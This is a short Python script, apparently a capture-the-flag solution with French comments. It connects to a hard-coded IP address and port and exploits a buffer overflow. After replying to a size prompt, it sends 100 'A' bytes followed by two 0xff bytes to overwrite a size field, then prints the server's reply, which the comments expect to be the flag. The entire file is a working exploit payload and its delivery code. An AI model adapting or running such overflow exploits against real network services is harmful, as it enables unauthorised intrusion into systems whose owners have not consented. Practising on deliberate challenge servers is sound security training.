import socket

HOST = '45.33.118.86'
PORT = 9994

def exploit():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        # Lecture du message initial "How big is your input?"
        data = s.recv(1024).decode()
        print(data.strip())

        # Envoyer la taille 100
        s.sendall(b"100\n")
        data = s.recv(1024).decode()
        print(data.strip())  # "Enter your input:" attendu

        # Construire payload :
        # 100 'A' pour remplir le buffer
        # + 2 octets \xff\xff pour écraser size = 0xffff
        payload = b"A" * 100 + b"\xff\xff\n"

        s.sendall(payload)

        # Lire la réponse (probablement le flag)
        response = s.recv(4096).decode()
        print(response)

if __name__ == "__main__":
    exploit()
